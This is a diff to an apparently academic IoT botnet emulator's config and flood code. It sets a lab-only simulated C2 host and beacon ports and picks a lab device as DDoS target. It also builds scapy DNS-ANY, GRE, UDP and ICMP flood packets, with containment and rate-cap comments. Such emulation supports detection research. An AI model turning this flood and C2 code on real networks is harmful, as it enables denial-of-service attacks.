@@ -87,30 +87,37 @@ from testbed_lib import C
 # CONFIG  --  EDIT TO MATCH YOUR TESTBED (keep in step with iot_botnet_emulator.py;
 # a shared YAML config is the planned M6 consolidation)
 # =============================================================================
-LAB_NET = "192.168.50.0/24"
+LAB_NET = "192.168.25.0/24"
 ALLOW_NONPRIVATE = False
 
 # One self-owned C2/peer endpoint MAY live outside the lab (PROJECT.md s5).
 # Put its IP or hostname here to permit egress to exactly that host; empty =
 # everything stays locked inside LAB_NET.
-EGRESS_ALLOW: tuple[str, ...] = ()
+#   Our C2 is the lab PC (Ubuntu), cabled to the Pi's eth0 on a dedicated,
+#   isolated WAN segment: Pi eth0 = 10.10.10.1, PC USB NIC = 10.10.10.60. The
+#   beacon crosses the gateway (wlan0 -> eth0); the segment is NOT connected to
+#   the university network, so containment holds.
+EGRESS_ALLOW: tuple[str, ...] = ("10.10.10.60",)
 
-GATEWAY = "192.168.50.1"            # Raspberry Pi: router / DNS / MQTT broker
+GATEWAY = "192.168.25.1"            # Raspberry Pi: router / DNS / MQTT broker (LAN/AP = wlan0)
 
-# simulated C2 / loader / peer, on a SEPARATE host from the gateway
-SIM_C2 = "192.168.50.60"
+# simulated C2 / loader / peer: the lab PC on the WAN segment (Pi eth0 side)
+SIM_C2 = "10.10.10.60"
 C2_HTTP_PORT = 80                   # register / gate.php / config pull
 C2_TCP_PORT = 4444                  # raw-TCP C2 (mirai heartbeat, gafgyt tokens)
 
 DEVICES = {
-    "esp32_sensor": "192.168.50.15",
-    "smart_bulb":   "192.168.50.20",
-    "smart_plug":   "192.168.50.25",
-    "mqtt_client":  "192.168.50.50",
+    "esp32_sensor": "192.168.25.15",
+    "smart_bulb":   "192.168.25.20",
+    "smart_plug":   "192.168.25.25",
+    "mqtt_client":  "192.168.25.50",
 }
 VICTIM = DEVICES["mqtt_client"]     # "patient zero"
-DDOS_TARGET = DEVICES["smart_bulb"] # a lab device to flood (NEVER the gateway --
-                                    # that would drop the capture/C2 path mid-run)
+# A lab device to flood -- MUST be live/ARP-reachable or the burst is negligible,
+# and NEVER the gateway (that would drop the capture/C2 path mid-run). The ESP32
+# at .15 is the confirmed-live device on the current testbed; change as devices
+# come online. (See docs/runbook.md "pick a live DDoS target".)
+DDOS_TARGET = DEVICES["esp32_sensor"]
 
 # Mozi DHT: peers stay in the lab for containment. The real public bootstrap
 # nodes (router.bittorrent.com:6881, dht.transmissionbt.com:6881, etc.) are
@@ -257,6 +264,11 @@ def _imp(mod_path):
 
 SCAPY = _imp("scapy.all")
 MQTT = _imp("paho.mqtt.client")
+
+# silence scapy's per-packet "MAC address ... Using broadcast" ARP-miss warnings
+if SCAPY:
+    import logging as _logging
+    _logging.getLogger("scapy.runtime").setLevel(_logging.ERROR)
 
 
 # =============================================================================
@@ -626,6 +638,9 @@ def _dos_burst(ctx, vector: str) -> int:
     if not SCAPY:
         tl.info("      scapy missing -- skipping raw vector", C.Y)
         return 0
+    if not spoof and SCAPY.getmacbyip(DDOS_TARGET) is None:
+        tl.info(f"      {DDOS_TARGET} is not ARP-reachable (powered off / not on the LAN?) -- "
+                f"this burst will be negligible; point DDOS_TARGET at a live host", C.Y)
     interval = 1.0 / DOS_BURST_PPS_CAP
     count = 0
     while _t.time() < end and not tl.stopped():
@@ -643,7 +658,7 @@ def _dos_burst(ctx, vector: str) -> int:
                                  dport=random.choice([5683, 53, 123])) / (b"x" * 32)
         elif vector == "dns":
             pkt = ip / SCAPY.UDP(sport=SCAPY.RandShort(), dport=53) / \
-                SCAPY.DNS(rd=1, qd=SCAPY.DNSQR(qname="lab.example.", qtype="ANY"))
+                SCAPY.DNS(rd=1, qd=SCAPY.DNSQR(qname="lab.example.", qtype=255))  # 255 = ANY
         elif vector == "gre":
             pkt = ip / SCAPY.GRE() / SCAPY.IP(dst=DDOS_TARGET) / (b"x" * 32)
         else:  # icmp
